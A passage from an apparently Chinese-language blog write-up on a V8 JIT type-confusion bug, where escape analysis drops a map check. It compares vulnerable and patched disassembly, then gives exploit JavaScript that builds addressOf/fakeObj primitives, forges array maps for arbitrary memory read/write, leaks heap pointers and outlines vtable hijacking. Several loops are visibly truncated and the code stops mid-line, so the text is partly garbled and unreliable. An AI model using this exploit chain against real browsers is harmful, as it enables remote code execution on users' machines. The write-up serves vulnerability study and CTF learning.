    0x2343000857db   1bb  41ffd2         call r10 ;调用外部函数
    0x2343000857de   1be  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x2343000857e2   1c2  448b4107       movl r8,[rcx+0x7] ;以DOUBLE_ELEMENTS的方式取数据
    0x2343000857e6   1c6  4d03c5         REX.W addq r8,r13
    0x2343000857e9   1c9  448b490b       movl r9,[rcx+0xb]
    0x2343000857ed   1cd  41d1f9         sarl r9, 1
    0x2343000857f0   1d0  4183f900       cmpl r9,0x0
    0x2343000857f4   1d4  0f869a010000   jna 0x234300085994  
    0x2343000857fa   1da  c4c17b104007   vmovsd xmm0,[r8+0x7]
    0x234300085800   1e0  c5fb2cc8       vcvttsd2si rcx,xmm0
    0x234300085804   1e4  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx
    0x234300085808   1e8  c5f92ec8       vucomisd xmm1,xmm0
    0x23430008580c   1ec  0f8a39000000   jpe 0x23430008584b  
    0x234300085812   1f2  0f8533000000   jnz 0x23430008584b  
    0x234300085818   1f8  83f900         cmpl rcx,0x0
    0x23430008581b   1fb  0f8428010000   jz 0x234300085949  
如下是无漏洞的JIT代码
    0x286d000857b0   1b0  49ba405e010f7e7f0000 REX.W movq r10,0x7f7e0f015e40  (Call_ReceiverIsNullOrUndefined)    ;; off heap target
    0x286d000857ba   1ba  41ffd2         call r10
    0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd 
    0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8
    0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  
    0x286d000857d1   1d1  448b4107       movl r8,[rcx+0x7]
    0x286d000857d5   1d5  4d03c5         REX.W addq r8,r13
    0x286d000857d8   1d8  448b490b       movl r9,[rcx+0xb]
    0x286d000857dc   1dc  41d1f9         sarl r9, 1
    0x286d000857df   1df  4183f900       cmpl r9,0x0
    0x286d000857e3   1e3  0f8692010000   jna 0x286d0008597b  
    0x286d000857e9   1e9  c4c17b104007   vmovsd xmm0,[r8+0x7]
    0x286d000857ef   1ef  c5fb2cc8       vcvttsd2si rcx,xmm0
    0x286d000857f3   1f3  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx
    0x286d000857f7   1f7  c5f92ec8       vucomisd xmm1,xmm0
    0x286d000857fb   1fb  0f8a25000000   jpe 0x286d00085826  
    0x286d00085801   201  0f851f000000   jnz 0x286d00085826  
    0x286d00085807   207  83f900         cmpl rcx,0x0
    0x286d0008580a   20a  0f8414010000   jz 0x286d00085924  
可以发现，由于逃逸分析时把`checkmaps`删除了，使得生成的JIT代码里调用完函数后少了如下的检查代码，由此发生类型混淆
    0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd 
    0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8
    0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  
## 0x03 漏洞利用
利用类型混淆，构造addressOf和fakeObj原语，然后利用两个原语伪造一个ArrayBuffer，实现任意地址读写。然后可以创建一个`div`对象，利用任意地址读写篡改其虚表，然后执行对应的操作劫持程序流
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    function u32f(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true);
    }
    function i2f(value) {
       dv.setUint32(0,value,true);
       return dv.getFloat32(0,true);
    }
    //
    function opt0(o) {
       for(var i = 0; i {});
    }
    var spary_size = 0x201;
    var spary = new Array(spary_size);
    for (var i=0;i{o[0][0] = obj;});
       return u32f(addr) - 1;
    }
    function fakeObject(addr) {
       var fval = i2f64(addr + 1);
       let f = eval(`(x,y,val)=>{
         for(var i = 0; i {},(o)=>{},fval);
       }
       return f((o)=>{o[0][0] = {};},(o)=>{return o[0][0];},fval);
    }
    let arr = spary[spary_size-0x3];
    let arr_address = addressOf(arr);
    let proto_addr = addressOf(Array.prototype);
    //fake a FixedDoubleArray Map
    arr[0] = p64f(0x08042115,0x18040404);
    arr[1] = p64f(0x29000423,0x0a0007ff);
    arr[2] = p64f(proto_addr+1,0);
    //alert(arr_address.toString(16));
    let element_addr = arr_address + 0x14;
    let fake_element = element_addr+0x44;
    //fake a FixedDoubleArray
    arr[4] = p64f(0,element_addr+0x8+0x1);
    arr[5] = p64f(0x08042229,fake_element+1);
    arr[6] = p64f(0x7ffffffe,0);
    //fake a FixedDoubleArray's element
    arr[7] = p64f(0,0x08042ab1);
    arr[8] = p64f(0x7ffffffe,0);
    var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);
    //leak backing store
    backing_store_addr = u64f(arb_fixeddouble_arr[0x9]);
    heap_t_addr = u64f(arb_fixeddouble_arr[0xa])
    //alert(backing_store_addr.toString(16));
    //alert(heap_t_addr.toString(16));
    //leak compression ptr high byte
    compression_high_bytes = u32f(arb_fixeddouble_arr[0x20]);
    //alert(compression_high_bytes.toString(16));
    function addressOf_full(obj) {
       var addr = addressOf(obj);
       return (BigInt(compression_high_bytes) 
## 0x04 感想
在写这篇文章的过程中，某些疑难点无形中理解了，以后得坚持写文章记录过程。
## 0x05 参考
[JVM之逃逸分析](https://zhuanlan.zhihu.com/p/59215831)  
[深入理解Java中的逃逸分析](https://blog.csdn.net/hollis_chuang/article/details/80922794)  
[[JVM] 逃逸分析(Escape Analysis）](https://www.cnblogs.com/aiqiqi/p/10650394.html)  
[Escape Analysis in V8](https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf)  
[Pwn2Win OmniTmizer](https://yichenchai.github.io/blog/omnitmizer)